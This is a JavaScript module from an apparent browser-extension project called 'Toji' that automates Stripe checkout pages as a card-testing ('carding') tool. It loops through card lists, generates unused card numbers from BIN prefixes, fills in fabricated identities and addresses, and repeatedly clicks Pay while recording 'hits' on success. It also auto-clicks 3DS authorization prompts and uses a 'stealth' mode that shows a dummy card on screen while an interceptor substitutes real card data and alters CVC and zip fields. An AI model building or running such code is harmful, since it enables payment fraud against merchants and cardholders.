/**
 * Toji Project - Stripe Engine (Full Rewrite)
 * Developed by @RealYashvirGaming
 */

import { MouseSim } from '../utils/mouse-sim.js';
import { AddressGenerator } from '../utils/address-generator.js';
import { CardGenerator } from '../utils/card-generator.js';

class StripeEngine {
    constructor() {
        this.active = false;
        this.processing = false; // Lock during payment
        this._dummyFilled = false; // NEW: Track if we've already typed the dummy card
        this.retryInterval = null;
        this.clickInterval = null;
        this.errorDetectionInterval = null;
    }

    async run(settings) {
        if (this.active) return;
        this.active = true;

        console.log('[Toji] Stripe Engine (SPAM MODE) Active. Frame:', window.self !== window.top ? 'IFRAME' : 'MAIN');

        // Initial setup
        const isIframe = window.self !== window.top;
        
        if (isIframe) {
            await this.fillCardIframe();
            setInterval(() => this.fillCardIframe(), 2000);
        } else {
            // Main frame automation loop
            this.startSpamLoop(settings);
            this.setupIframeListener();
            this.startErrorDetection(settings);
            this.listenForCapture(); // New: Reset processing on capture
        }
    }

    async startSpamLoop(settings) {
        console.log('[Toji] Starting Spam Loop...');
        
        while (this.active && !window.TOJI_STOPPED) {
            if (this.processing) {
                await this._wait(1000);
                continue;
            }

            // 1. Unlock everything first
            this.unlockFields();
            this.bypassAddressRestrictions();

            // 2. Refresh settings
            const updatedSettings = await chrome.runtime.sendMessage({ type: 'GET_SETTINGS' });
            this.lastSettings = updatedSettings; // Save for capture listener

            if (updatedSettings.enabled === false) {
                this.stopEngine();
                break;
            }

            const card = await this._pickCard(updatedSettings);
            chrome.runtime.sendMessage({ type: 'SET_ACTIVE_CARD', card: card });
            
            // 2.5 Notify Injected Script if Payload Substitution is active
            if (updatedSettings.payloadSubstitution) {
                const dummy = '4242424242424242'; // Stripe dummy
                window.postMessage({ 
                    type: 'SET_REAL_CARD', 
                    card: card, 
                    dummy: dummy,
                    elite: {
                        cvcModifier: updatedSettings.cvcModifier,
                        customCvc: updatedSettings.customCvc,
                        removePaymentAgent: updatedSettings.removePaymentAgent,
                        removeZipCode: updatedSettings.removeZipCode
                    }
                }, '*');
                console.log('[Toji] 🛡️ Stealth Mode: Real Card data ('+ card.number.slice(0,6) +'...) + Elite Settings sent to Interceptor');
            }
            
            // 3. Fill page (Only if not already filled or if reset)
            const shouldRefill = !updatedSettings.payloadSubstitution || !this._dummyFilled || this.isFormEmpty();
            if (shouldRefill) {
                await this.fillMainPage({ ...updatedSettings, card });
                console.log('[Toji] Waiting 3 seconds after full fill...');
                await this._wait(3000);
                if (updatedSettings.payloadSubstitution) this._dummyFilled = true;
            } else {
                console.log('[Toji] ⚡ High-Frequency Mode: Skipping fill, using persistent dummy card.');
                await this._wait(500); // Small wait to simulate human-ish pacing
            }

            // 5. Click Pay
            if (updatedSettings.autoClick !== false && !window.TOJI_STOPPED && !this.processing) {
                await this.clickSubmit({ ...updatedSettings, card });
            }

            // 6. Wait EXACTLY 3 seconds BEFORE NEXT CC
            console.log('[Toji] Waiting 3 seconds before rotating to next CARD...');
            await this._wait(3000);
        }
    }

    isFormEmpty() {
        const iNum = document.querySelector('input[autocomplete="cc-number"], #cardNumber');
        return !iNum || !iNum.value || iNum.value.length < 5;
    }

    listenForCapture() {
        // Reset the processing lock when a response is captured by content.js
        window.addEventListener('TOJI_RESPONSE_CAPTURED', async (e) => {
            const data = e.detail;
            console.log('[Toji] ⚡ Network Response captured:', data);
            this.processing = false;

            if (!data) return;

            // Report directly to background
            if (data.success) {
                chrome.runtime.sendMessage({ type: 'REPORT_HIT', data: { gateway: 'Stripe' } });
            }

            // Immediately clear the error detection guard
            this._domErrorGuard = false;

            // Advance the machine
            await this.advanceAndRetry(this.lastSettings || { refreshOnDecline: false }, data.message, data.success);
            
            this._domErrorGuard = true;
        });
    }

    startErrorDetection(settings) {
        this._domErrorGuard = true;
        // Check for DOM errors rapidly
        setInterval(async () => {
            if (window.TOJI_STOPPED || !this._domErrorGuard) return;

            const errNodes = document.querySelectorAll('.FieldError, .p-FieldError, [role="alert"], .Error-message, [class*="error" i], .StatusPanel-error, .messaging, .Notification-label');
            let errorDetected = false;
            let errorText = '';

            for (const node of errNodes) {
                if (node.innerText && node.innerText.length > 3 && node.getBoundingClientRect().height > 0) {
                    const txt = node.innerText.toLowerCase();
                    // Catch common decline keywords
                    if (txt.includes('decline') || txt.includes('fail') || txt.includes('error') || txt.includes('invalid') || txt.includes('incorrect') || txt.includes('try again') || txt.includes('unable') || txt.includes('security code')) {
                        errorDetected = true;
                        errorText = node.innerText;
                        break;
                    }
                }
            }

            if (errorDetected && !window.TOJI_STOPPED) {
                // If we were stuck in processing, release it now
                if (this.processing) {
                    this.processing = false;
                }
                this._domErrorGuard = false; 
                await this.advanceAndRetry(settings, errorText);
                this._domErrorGuard = true;
            }

            // High-Frequency 3DS Bypass (Test mode)
            const authorizeBtn = document.querySelector('button#test-source-authorize-3ds, #test-source-authorize-3ds, [id*="authorize-3ds"], [class*="authorize-3ds"]');
            if (authorizeBtn && !authorizeBtn.disabled) {
                console.log('[Toji] 🚀 3DS Auto-Bypass Triggered');
                authorizeBtn.click();
            }
        }, 1000);
    }

    stopEngine() {
        this.active = false;
        this.processing = false;
        console.log('[Toji] Stripe Engine STOPPED.');
    }

    async advanceAndRetry(settings, reason = 'DECLINED', isSuccess = false) {
        if (window.TOJI_STOPPED) return;
        
        // Prevent multiple simultaneous retries
        if (this._retrying) return;
        this._retrying = true;

        console.log('[Toji] Advancing machine — Result:', reason);
        try {
            if (!isSuccess) {
                await chrome.runtime.sendMessage({ type: 'RECORD_ERROR', reason });
            }
            // Always rotate to next card if not a final success
            if (!isSuccess) {
                await chrome.runtime.sendMessage({ type: 'ADVANCE_CARD_INDEX' });
            }
        } catch (e) {}
        
        this.processing = false;

        // Show result for 2 seconds
        await this._wait(2000);
        
        if (settings.refreshOnDecline && !window.TOJI_STOPPED && !isSuccess) {
            window.location.reload();
        } else {
            // ONLY clear if we aren't in high-frequency dummy mode
            if (!isSuccess && !settings.payloadSubstitution) {
                this.clearFields();
                this._dummyFilled = false;
            }
            this._retrying = false;
        }
    }

    clearFields() {
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            if (input.name.toLowerCase().includes('card') || input.name.toLowerCase().includes('expiry') || input.name.toLowerCase().includes('cvc')) {
                input.value = '';
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
            }
        });
        MouseSim.removeOverlays();
    }

    async _pickCard(settings) {
        let entry = settings.card || {};
        
        // 1. Get current candidate from rotating list
        if (settings.cards && settings.cards.length > 0) {
            const idx = (settings.cardIndex || 0) % settings.cards.length;
            entry = settings.cards[idx];
        }

        // 2. Identify BIN vs Full Card
        const cleanVal = (entry.number || entry.bin || '').replace(/\D/g, '');
        const isBin = cleanVal.length >= 6 && cleanVal.length <= 12;

        if (isBin) {
            console.log('[Toji] 💎 BIN Mode Detected (' + cleanVal + '). Generating UNIQUE Card...');
            
            // Loop until we find a fresh, unused number
            let attempts = 0;
            while (attempts < 100) {
                const gen = CardGenerator.generateFromBin({
                    bin: cleanVal,
                    month: entry.month || null,
                    year: entry.year || null,
                    cvc: entry.cvc || null
                });

                if (gen) {
                    // Central Uniqueness Check (Shield)
                    const status = await chrome.runtime.sendMessage({ 
                        type: 'CHECK_AND_MARK_USED', 
                        number: gen.number 
                    });

                    if (status && status.used === false) {
                        console.log('[Toji] 🚀 Unique CC Generated:', gen.number.slice(0,6) + '...', gen.cvc);
                        return {
                            ...gen,
                            expiry: `${gen.month}/${gen.year.slice(-2)}`
                        };
                    } else {
                        console.log('[Toji] 🛡️ Duplicate CC Detected! Regenerating...');
                    }
                }
                attempts++;
            }
            return null;
        }

        // 3. Fallback to Full Card logic (Still check for duplicates)
        if (entry.number) {
            const raw = entry.number.replace(/\D/g, '');
            if (raw.length >= 15) {
                const status = await chrome.runtime.sendMessage({ 
                    type: 'CHECK_AND_MARK_USED', 
                    number: raw 
                });
                return entry;
            }
        }

        return entry;
    }

    async fillMainPage(settings) {
        MouseSim.removeOverlays();

        // Generate identity
        let identity;
        try {
            identity = await AddressGenerator.generate(settings.country || 'US');
        } catch (e) {
            identity = { name: 'John Smith', email: 'john.smith123@gmail.com', street: '123 Main St', city: 'New York', state: 'NY', zip: '10001', country: 'US' };
        }

        const card = settings.card || {};

        console.log('[Toji] Identity generated:', identity);
        
        // ── IDENTITY FIELDS: Use PASTE (Instant) ───────────────────────────────
        
        // Fill email
        await this._fillFirst([
            'input[type="email"]', 'input[name="email"]', 'input[autocomplete*="email"]', 
            'input[id*="email"]', 'input[placeholder*="email" i]', '[class*="email" i] input', 
            'input[aria-label*="email" i]', '#email'
        ], settings.email || identity.email, true);

        await this._wait(100);

        // Fill cardholder name
        await this._fillFirst([
            '#billingName', 'input[name="billingName"]', 'input[name="cardholder-name"]', 
            'input[name="cardholder"]', 'input[name="name"]', 'input[name*="name"]',
            'input[placeholder*="name" i]', 'input[autocomplete="cc-name"]', 
            'input[autocomplete*="name"]', 'input[aria-label*="name" i]', 
            'input[data-testid*="name"]', '[class*="billingName"] input', 'input[id*="name"]'
        ], identity.name, true);

        await this._wait(100);

        // Set country dropdown
        await this._selectFirst([
            'select[name="billingCountry"]', 'select[name="country"]', 'select[autocomplete*="country"]',
            '#billingCountry', 'select[id*="country"]'
        ], identity.country);

        // Or if country is an input text
        await this._fillFirst([
            'input[name*="country"]', 'input[placeholder*="country" i]', 'input[aria-label*="country" i]', 
            'input[data-testid*="country"]', 'input[id*="country"]'
        ], identity.country, true);

        await this._wait(300);

        // Fill address line 1
        await this._fillFirst([
            '#billingAddressLine1', 'input[name="billingAddressLine1"]', 'input[name="addressLine1"]', 
            'input[name="address"]', 'input[name="address1"]', 'input[name*="address_line1"]', 
            'input[name*="address1"]', 'input[placeholder*="address" i]', 
            'input[autocomplete*="address-line1"]', 'input[aria-label*="address" i]', 
            'input[data-testid*="address"]', 'input[id*="address"]'
        ], identity.street, true);

        await this._wait(100);

        // Fill address line 2 (just in case)
        await this._fillFirst([
            'input[name*="address2"]', 'input[name*="address_line2"]', 'input[placeholder*="apartment" i]',
            'input[aria-label*="apartment" i]', 'input[data-testid*="apartment"]'
        ], 'Apt 1', true);

        await this._wait(100);

        // Fill city
        await this._fillFirst([
            '#billingLocality', 'input[name="billingLocality"]', 'input[name="city"]', 'input[name*="city"]',
            'input[placeholder*="city" i]', 'input[autocomplete*="address-level2"]', 
            'input[aria-label*="city" i]', 'input[data-testid*="city"]', 'input[id*="city"]'
        ], identity.city, true);

        await this._wait(100);

        // Fill ZIP/postal
        await this._fillFirst([
            '#billingPostalCode', 'input[name="billingPostalCode"]', 'input[name="postalCode"]', 
            'input[name="zip"]', 'input[name*="postal"]', 'input[name*="zip"]',
            'input[placeholder*="zip" i]', 'input[placeholder*="postal" i]', 
            'input[autocomplete="postal-code"]', 'input[aria-label*="postal" i]', 
            'input[aria-label*="zip" i]', 'input[data-testid*="postal"]', 'input[data-testid*="zip"]',
            'input[id*="postal"]', 'input[id*="zip"]'
        ], identity.zip, true);

        await this._wait(100);

        // Fill state (try dropdown first, then text input)
        await this._selectFirst([
            'select[name="billingAdministrativeArea"]', 'select[name="state"]', 
            'select[name*="state"]', 'select[autocomplete*="address-level1"]',
            'select[autocomplete*="state"]'
        ], identity.state);

        await this._fillFirst([
            'input[name="billingAdministrativeArea"]', 'input[name="state"]', 'input[name*="state"]',
            'input[placeholder*="state" i]', 'input[autocomplete*="address-level1"]',
            'input[aria-label*="state" i]', 'input[data-testid*="state"]', 'input[id*="state"]'
        ], identity.state, true);
        
        // ── CARD FIELDS: Use PASTE ────────────────────────────────────────────────
        
        const useDummy = settings.payloadSubstitution === true;
        const fillCard = useDummy ? {
            number: '4242424242424242',
            expiry: '12/34',
            cvc: '123'
        } : card;

        if (useDummy) console.log('[Toji] 🛡️ Stealth Mode: Filling with DUMMY card on screen');

        // Try to fill card fields directly
        if (fillCard.number) {
            await this._fillFirst([
                '#cardNumber', 'input[name="cardNumber"]', 'input[name*="card"]', 
                'input[autocomplete="cc-number"]', 'input[id="cardNumber"]',
                '[data-elements-stable-field-name*="cardNumber"]', 'input[aria-label*="card" i]', 
                'input[placeholder*="card" i]', '[data-fieldtype="number"]'
            ], fillCard.number, true);
        }
        if (fillCard.expiry) {
            await this._fillFirst([
                '#cardExpiry', 'input[name="cardExpiry"]', 'input[name*="expir"]', 
                'input[autocomplete="cc-exp"]', 'input[id="cardExpiry"]',
                '[data-elements-stable-field-name*="cardExpiry"]', 'input[aria-label*="expir" i]', 
                'input[placeholder*="MM" i]', '[data-fieldtype="expiry"]'
            ], fillCard.expiry, true);
        }
        if (fillCard.cvc) {
            await this._fillFirst([
                '#cardCvc', 'input[name="cardCvc"]', 'input[name*="cvc"]', 'input[name*="cvv"]', 
                'input[autocomplete="cc-csc"]', 'input[id="cardCvc"]',
                '[data-elements-stable-field-name*="cardCvc"]', 'input[aria-label*="CVC" i]', 
                'input[placeholder*="CVC" i]', '[data-fieldtype="cvc"]'
            ], fillCard.cvc, true);
        }

        console.log('[Toji] Main page fill complete.');
    }

    async fillCardIframe() {
        const liveSettings = await chrome.runtime.sendMessage({ type: 'GET_SETTINGS' });
        const card = await this._pickCard(liveSettings) || {};

        // Determine what field this iframe holds based on URL or input type
        const iUrl = window.location.href;
        const isNumber = iUrl.includes('number') || iUrl.includes('cardNum') || !!document.querySelector('input[name="number"]');
        const isExpiry = iUrl.includes('expiry') || iUrl.includes('exp') || !!document.querySelector('input[name="expiry"]');
        const isCVC = iUrl.includes('cvc') || iUrl.includes('cvv') || !!document.querySelector('input[name="cvc"]');

        // Also scan the single input in the iframe
        const input = document.querySelector('input');
        if (!input) return;

        let value = '';
        const useDummy = liveSettings.payloadSubstitution === true;
        const fillCard = useDummy ? {
            number: '4242424242424242',
            expiry: '12/34',
            cvc: '123'
        } : card;

        if (isNumber && fillCard.number) value = fillCard.number;
        else if (isExpiry && fillCard.expiry) value = fillCard.expiry;
        else if (isCVC && fillCard.cvc) value = fillCard.cvc;

        if (value) {
            MouseSim.unlockElement(input);
            // Replace spaces to compare cleanly against formatted inputs
            const formatVal = input.value.replace(/\s+/g, '');
            const rawVal = value.replace(/\s+/g, '');
            if (!input.value || (formatVal !== rawVal && formatVal.length < rawVal.length)) {
                await MouseSim.paste(input, value);
                console.log('[Toji] Iframe field filled:', iUrl);
            }
        }
    }

    setupIframeListener() {
        // Listen for postMessage from iframe fills
        window.addEventListener('message', (e) => {
            if (e.data && e.data.type === 'TOJI_FIELD_FILLED') {
                console.log('[Toji] Iframe field confirmed:', e.data.field);
            }
        });
    }

    async clickSubmit(settings) {
        if (settings.autoClick === false || this.processing) return false;

        console.log('[Toji] Attempting to click Submit/Pay button...');

        // Check if we should still proceed
        if (this.processing || window.TOJI_STOPPED) return false;

        const submitSelectors = [
            '.SubmitButton',
            '[class*="SubmitButton"]', 
            'button[type="submit"]',
            '[data-testid*="submit"]', 
            '[data-testid*="pay"]',
            '[class*="Button--primary"]',
            '#submitButton',
            '.x-payment-button',
            '.p-Button'
        ];

        for (const selector of submitSelectors) {
            try {
                const btn = document.querySelector(selector);
                if (btn && !btn.disabled) {
                    const rect = btn.getBoundingClientRect();
                    if (rect.width > 0 && rect.height > 0) {
                        console.log('[Toji] Clicking Submit Button:', selector);
                        
                        // Set processing lock BEFORE clicking to prevent race conditions
                        this.processing = true;
                        
                        btn.focus && btn.focus();
                        btn.click();

                        // Safety timeout: If no response in 20s, release lock
                        setTimeout(() => {
                            if (this.processing) {
                                console.log('[Toji] Processing timeout. Releasing lock.');
                                this.processing = false;
                            }
                        }, 20000);

                        return true;
                    }
                }
            } catch(e) {}
        }
        return false;
    }

    async _fillFirst(selectors, value, paste = false) {
        if (!value) return;
        for (const selector of selectors) {
            const el = document.querySelector(selector);
            if (el && el.tagName !== 'SELECT') {
                MouseSim.unlockElement(el);
                if (!el.value || el.value.length < 2) {
                    if (paste) {
                        await MouseSim.paste(el, String(value));
                    } else {
                        await MouseSim.type(el, String(value));
                    }
                    console.log('[Toji] Filled:', selector, '=', value);
                    return true;
                }
            }
        }
        return false;
    }

    async _selectFirst(selectors, value) {
        if (!value) return;
        for (const selector of selectors) {
            const el = document.querySelector(selector);
            if (el && el.tagName === 'SELECT') {
                MouseSim.unlockElement(el);
                // Try exact match first, then partial
                const options = Array.from(el.options);
                const match = options.find(o =>
                    o.value.toLowerCase() === value.toLowerCase() ||
                    o.text.toLowerCase().includes(value.toLowerCase())
                );
                if (match) {
                    el.value = match.value;
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    console.log('[Toji] Selected:', selector, '=', match.value);
                    return true;
                }
            }
        }
        return false;
    }

    _wait(ms) {
        return new Promise(r => setTimeout(r, ms));
    }

    unlockFields() {
        MouseSim.removeOverlays();
        const inputs = document.querySelectorAll('input, select, textarea');
        inputs.forEach(el => MouseSim.unlockElement(el));

        // Remove Stripe-specific overlays
        const stripeBlocked = document.querySelectorAll('.p-Modal, .loading, [class*="loading" i]');
        stripeBlocked.forEach(el => {
            if (el.innerText.toLowerCase().includes('processing')) {
                // keep it
            } else {
                el.style.opacity = '0';
                el.style.pointerEvents = 'none';
            }
        });
    }

    bypassAddressRestrictions() {
        // Force click any "Edit" or "Change" buttons to reveal hidden fields
        const editBtns = document.querySelectorAll('button[aria-label*="edit" i], button[class*="edit" i], .Link-button');
        editBtns.forEach(btn => {
            if (btn.innerText.toLowerCase().includes('edit') || btn.innerText.toLowerCase().includes('change')) {
                btn.click();
            }
        });
    }
}

export default new StripeEngine();
